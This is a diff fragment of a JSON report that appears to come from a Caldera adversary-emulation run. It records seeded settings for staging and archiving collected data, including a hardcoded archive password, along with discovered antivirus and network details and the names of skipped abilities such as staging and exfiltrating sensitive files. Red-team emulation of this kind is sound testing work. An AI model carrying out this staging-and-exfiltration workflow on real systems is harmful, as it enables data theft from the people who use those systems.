+      "relationships": [],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "file.last.modified",
+      "origin_type": "SEEDED",
+      "links": [],
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "collected_by": [],
+      "name": "file.last.modified",
+      "created": "2023-09-22T07:50:33Z",
+      "value": "-30"
+    },
+    {
+      "technique_id": "",
+      "unique": "windows.included.directoriesc:\\users",
+      "relationships": [],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "windows.included.directories",
+      "origin_type": "SEEDED",
+      "links": [],
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "collected_by": [],
+      "name": "windows.included.directories",
+      "created": "2023-09-22T07:50:33Z",
+      "value": "c:\\users"
+    },
+    {
+      "technique_id": "",
+      "unique": "linux.included.directories/home",
+      "relationships": [],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "linux.included.directories",
+      "origin_type": "SEEDED",
+      "links": [],
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "collected_by": [],
+      "name": "linux.included.directories",
+      "created": "2023-09-22T07:50:33Z",
+      "value": "/home"
+    },
+    {
+      "technique_id": "",
+      "unique": "windows.excluded.directorieslinks,music,saved games,contacts,videos,source,onedrive",
+      "relationships": [],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "windows.excluded.directories",
+      "origin_type": "SEEDED",
+      "links": [],
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "collected_by": [],
+      "name": "windows.excluded.directories",
+      "created": "2023-09-22T07:50:33Z",
+      "value": "links,music,saved games,contacts,videos,source,onedrive"
+    },
+    {
+      "technique_id": "",
+      "unique": "linux.excluded.directories.local,.cache,lib,caldera",
+      "relationships": [],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "linux.excluded.directories",
+      "origin_type": "SEEDED",
+      "links": [],
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "collected_by": [],
+      "name": "linux.excluded.directories",
+      "created": "2023-09-22T07:50:33Z",
+      "value": ".local,.cache,lib,caldera"
+    },
+    {
+      "technique_id": "",
+      "unique": "windows.staging.locationRecycle Bin",
+      "relationships": [],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "windows.staging.location",
+      "origin_type": "SEEDED",
+      "links": [],
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "collected_by": [],
+      "name": "windows.staging.location",
+      "created": "2023-09-22T07:50:33Z",
+      "value": "Recycle Bin"
+    },
+    {
+      "technique_id": "",
+      "unique": "linux.staging.location/tmp",
+      "relationships": [],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "linux.staging.location",
+      "origin_type": "SEEDED",
+      "links": [],
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "collected_by": [],
+      "name": "linux.staging.location",
+      "created": "2023-09-22T07:50:33Z",
+      "value": "/tmp"
+    },
+    {
+      "technique_id": "",
+      "unique": "safe.mode.enabledFalse",
+      "relationships": [],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "safe.mode.enabled",
+      "origin_type": "SEEDED",
+      "links": [],
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "collected_by": [],
+      "name": "safe.mode.enabled",
+      "created": "2023-09-22T07:50:33Z",
+      "value": "False"
+    },
+    {
+      "technique_id": "",
+      "unique": "pseudo.data.identifier_pseudo",
+      "relationships": [],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "pseudo.data.identifier",
+      "origin_type": "SEEDED",
+      "links": [],
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "collected_by": [],
+      "name": "pseudo.data.identifier",
+      "created": "2023-09-22T07:50:33Z",
+      "value": "_pseudo"
+    },
+    {
+      "technique_id": "",
+      "unique": "host.archive.passwordC4ld3ra",
+      "relationships": [],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "host.archive.password",
+      "origin_type": "SEEDED",
+      "links": [],
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "collected_by": [],
+      "name": "host.archive.password",
+      "created": "2023-09-22T07:50:33Z",
+      "value": "C4ld3ra"
+    },
+    {
+      "technique_id": "T1074.001",
+      "unique": "host.dir.staged/home/kali/staged",
+      "relationships": [
+        "host.dir.staged(/home/kali/staged)"
+      ],
+      "score": 2,
+      "limit_count": -1,
+      "trait": "host.dir.staged",
+      "origin_type": "LEARNED",
+      "links": [
+        "2f141405-04c8-4b83-94e2-4d3c24eb989d"
+      ],
+      "source": "333eb182-fc6b-41d4-a4ef-e70375ee814e",
+      "collected_by": [
+        "uzblob"
+      ],
+      "name": "host.dir.staged",
+      "created": "2023-09-22T07:51:46Z",
+      "value": "/home/kali/staged"
+    },
+    {
+      "technique_id": "T1560.001",
+      "unique": "host.dir.compress/home/kali/staged.tar.gz",
+      "relationships": [
+        "host.dir.compress(/home/kali/staged.tar.gz)"
+      ],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "host.dir.compress",
+      "origin_type": "LEARNED",
+      "links": [
+        "aec0b770-ec9b-4f14-9230-36d872f539e6"
+      ],
+      "source": "333eb182-fc6b-41d4-a4ef-e70375ee814e",
+      "collected_by": [
+        "uzblob"
+      ],
+      "name": "host.dir.compress",
+      "created": "2023-09-22T07:52:30Z",
+      "value": "/home/kali/staged.tar.gz"
+    },
+    {
+      "technique_id": "T1074.001",
+      "unique": "host.dir.stagedC:\\Windows\\system32\\staged",
+      "relationships": [
+        "host.dir.staged(C:\\Windows\\system32\\staged)"
+      ],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "host.dir.staged",
+      "origin_type": "LEARNED",
+      "links": [
+        "f72c8416-cca6-4153-a8fb-3f37dbde6634"
+      ],
+      "source": "333eb182-fc6b-41d4-a4ef-e70375ee814e",
+      "collected_by": [
+        "wmukjr"
+      ],
+      "name": "host.dir.staged",
+      "created": "2023-09-22T07:52:46Z",
+      "value": "C:\\Windows\\system32\\staged"
+    },
+    {
+      "technique_id": "T1518.001",
+      "unique": "host.installed.avdisplayName=Windows Defender",
+      "relationships": [
+        "host.installed.av(displayName=Windows Defender)"
+      ],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "host.installed.av",
+      "origin_type": "LEARNED",
+      "links": [
+        "045a22f4-f331-44f4-8f4f-355a3a7f32a6"
+      ],
+      "source": "333eb182-fc6b-41d4-a4ef-e70375ee814e",
+      "collected_by": [
+        "wmukjr"
+      ],
+      "name": "host.installed.av",
+      "created": "2023-09-22T07:54:25Z",
+      "value": "displayName=Windows Defender"
+    },
+    {
+      "technique_id": "T1518.001",
+      "unique": "host.installed.avinstanceGuid={D68DDC3A-831F-4fae-9E44-DA132C1ACF46}",
+      "relationships": [
+        "host.installed.av(instanceGuid={D68DDC3A-831F-4fae-9E44-DA132C1ACF46})"
+      ],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "host.installed.av",
+      "origin_type": "LEARNED",
+      "links": [
+        "045a22f4-f331-44f4-8f4f-355a3a7f32a6"
+      ],
+      "source": "333eb182-fc6b-41d4-a4ef-e70375ee814e",
+      "collected_by": [
+        "wmukjr"
+      ],
+      "name": "host.installed.av",
+      "created": "2023-09-22T07:54:25Z",
+      "value": "instanceGuid={D68DDC3A-831F-4fae-9E44-DA132C1ACF46}"
+    },
+    {
+      "technique_id": "T1518.001",
+      "unique": "host.installed.avpathToSignedProductExe=windowsdefender://",
+      "relationships": [
+        "host.installed.av(pathToSignedProductExe=windowsdefender://)"
+      ],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "host.installed.av",
+      "origin_type": "LEARNED",
+      "links": [
+        "045a22f4-f331-44f4-8f4f-355a3a7f32a6"
+      ],
+      "source": "333eb182-fc6b-41d4-a4ef-e70375ee814e",
+      "collected_by": [
+        "wmukjr"
+      ],
+      "name": "host.installed.av",
+      "created": "2023-09-22T07:54:25Z",
+      "value": "pathToSignedProductExe=windowsdefender://"
+    },
+    {
+      "technique_id": "T1518.001",
+      "unique": "host.installed.avpathToSignedReportingExe=%ProgramFiles%\\Windows Defender\\MsMpeng.exe",
+      "relationships": [
+        "host.installed.av(pathToSignedReportingExe=%ProgramFiles%\\Windows Defender\\MsMpeng.exe)"
+      ],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "host.installed.av",
+      "origin_type": "LEARNED",
+      "links": [
+        "045a22f4-f331-44f4-8f4f-355a3a7f32a6"
+      ],
+      "source": "333eb182-fc6b-41d4-a4ef-e70375ee814e",
+      "collected_by": [
+        "wmukjr"
+      ],
+      "name": "host.installed.av",
+      "created": "2023-09-22T07:54:25Z",
+      "value": "pathToSignedReportingExe=%ProgramFiles%\\Windows Defender\\MsMpeng.exe"
+    },
+    {
+      "technique_id": "T1518.001",
+      "unique": "host.installed.avproductState=401664",
+      "relationships": [
+        "host.installed.av(productState=401664)"
+      ],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "host.installed.av",
+      "origin_type": "LEARNED",
+      "links": [
+        "045a22f4-f331-44f4-8f4f-355a3a7f32a6"
+      ],
+      "source": "333eb182-fc6b-41d4-a4ef-e70375ee814e",
+      "collected_by": [
+        "wmukjr"
+      ],
+      "name": "host.installed.av",
+      "created": "2023-09-22T07:54:25Z",
+      "value": "productState=401664"
+    },
+    {
+      "technique_id": "T1518.001",
+      "unique": "host.installed.avtimestamp=Fri, 22 Sep 2023 07:38:37 GMT",
+      "relationships": [
+        "host.installed.av(timestamp=Fri, 22 Sep 2023 07:38:37 GMT)"
+      ],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "host.installed.av",
+      "origin_type": "LEARNED",
+      "links": [
+        "045a22f4-f331-44f4-8f4f-355a3a7f32a6"
+      ],
+      "source": "333eb182-fc6b-41d4-a4ef-e70375ee814e",
+      "collected_by": [
+        "wmukjr"
+      ],
+      "name": "host.installed.av",
+      "created": "2023-09-22T07:54:25Z",
+      "value": "timestamp=Fri, 22 Sep 2023 07:38:37 GMT"
+    },
+    {
+      "technique_id": "T1016",
+      "unique": "wifi.network.ssid-999                  Wired connection 1",
+      "relationships": [
+        "wifi.network.ssid(-999                  Wired connection 1)"
+      ],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "wifi.network.ssid",
+      "origin_type": "LEARNED",
+      "links": [
+        "75c6e58d-c0d8-436b-beea-e73ad163bfdf"
+      ],
+      "source": "333eb182-fc6b-41d4-a4ef-e70375ee814e",
+      "collected_by": [
+        "uzblob"
+      ],
+      "name": "wifi.network.ssid",
+      "created": "2023-09-22T07:54:41Z",
+      "value": "-999                  Wired connection 1"
+    },
+    {
+      "technique_id": "T1016",
+      "unique": "wifi.network.ssid0                     lo",
+      "relationships": [
+        "wifi.network.ssid(0                     lo)"
+      ],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "wifi.network.ssid",
+      "origin_type": "LEARNED",
+      "links": [
+        "75c6e58d-c0d8-436b-beea-e73ad163bfdf"
+      ],
+      "source": "333eb182-fc6b-41d4-a4ef-e70375ee814e",
+      "collected_by": [
+        "uzblob"
+      ],
+      "name": "wifi.network.ssid",
+      "created": "2023-09-22T07:54:41Z",
+      "value": "0                     lo"
+    },
+    {
+      "technique_id": "T1016",
+      "unique": "wifi.network.ssid0                     Lonelypheonix",
+      "relationships": [
+        "wifi.network.ssid(0                     Lonelypheonix)"
+      ],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "wifi.network.ssid",
+      "origin_type": "LEARNED",
+      "links": [
+        "75c6e58d-c0d8-436b-beea-e73ad163bfdf"
+      ],
+      "source": "333eb182-fc6b-41d4-a4ef-e70375ee814e",
+      "collected_by": [
+        "uzblob"
+      ],
+      "name": "wifi.network.ssid",
+      "created": "2023-09-22T07:54:41Z",
+      "value": "0                     Lonelypheonix"
+    },
+    {
+      "technique_id": "T1016",
+      "unique": "wifi.network.ssidThe Wireless AutoConfig Service (wlansvc) is not running.",
+      "relationships": [
+        "wifi.network.ssid(The Wireless AutoConfig Service (wlansvc) is not running.)"
+      ],
+      "score": 1,
+      "limit_count": -1,
+      "trait": "wifi.network.ssid",
+      "origin_type": "LEARNED",
+      "links": [
+        "fc3c5300-bd8f-4d92-afcd-983fb3420742"
+      ],
+      "source": "333eb182-fc6b-41d4-a4ef-e70375ee814e",
+      "collected_by": [
+        "wmukjr"
+      ],
+      "name": "wifi.network.ssid",
+      "created": "2023-09-22T07:56:08Z",
+      "value": "The Wireless AutoConfig Service (wlansvc) is not running."
+    }
+  ],
+  "skipped_abilities": [
+    {
+      "uzblob": [
+        {
+          "reason": "Mismatched ability platform and executor",
+          "reason_id": 1,
+          "ability_id": "316251ed-6a28-4013-812b-ddf5b5b007f8",
+          "ability_name": "Screen Capture"
+        },
+        {
+          "reason": "Mismatched ability platform and executor",
+          "reason_id": 1,
+          "ability_id": "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25",
+          "ability_name": "Get Chrome Bookmarks"
+        },
+        {
+          "reason": "Mismatched ability platform and executor",
+          "reason_id": 1,
+          "ability_id": "78524da1-f347-4fbb-9295-209f1f408330",
+          "ability_name": "Record microphone"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 3,
+          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+          "ability_name": "Find files"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 3,
+          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
+          "ability_name": "Stage sensitive files"
+        },
+        {
+          "reason": "Mismatched ability platform and executor",
+          "reason_id": 1,
+          "ability_id": "2dece965-37a0-4f70-a391-0f30e3331aba",
+          "ability_name": "Discover antivirus programs"
+        },
+        {
+          "reason": "Mismatched ability platform and executor",
+          "reason_id": 1,
+          "ability_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7",
+          "ability_name": "Sniff network traffic"
+        },
+        {
+          "reason": "Mismatched ability platform and executor",
+          "reason_id": 1,
+          "ability_id": "de52784d-4de6-4d4e-b79e-e7b68fe037fb",
+          "ability_name": "Add bookmark"
+        }
+      ]
+    },
+    {
+      "wmukjr": [
+        {
+          "reason": "Mismatched ability platform and executor",
+          "reason_id": 1,
+          "ability_id": "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25",
+          "ability_name": "Get Chrome Bookmarks"
+        },
+        {
+          "reason": "Mismatched ability platform and executor",
+          "reason_id": 1,
+          "ability_id": "78524da1-f347-4fbb-9295-209f1f408330",
+          "ability_name": "Record microphone"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 3,
+          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+          "ability_name": "Find files"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 3,
+          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
+          "ability_name": "Stage sensitive files"
+        },
+        {
+          "reason": "Fact dependency not fulfilled",
+          "reason_id": 3,
+          "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+          "ability_name": "Exfil staged directory"
+        },
+        {
+          "reason": "Mismatched ability platform and executor",
+          "reason_id": 1,
+          "ability_id": "de52784d-4de6-4d4e-b79e-e7b68fe037fb",
+          "ability_name": "Add bookmark"
+        }
+      ]
+    }
+  ]
+}
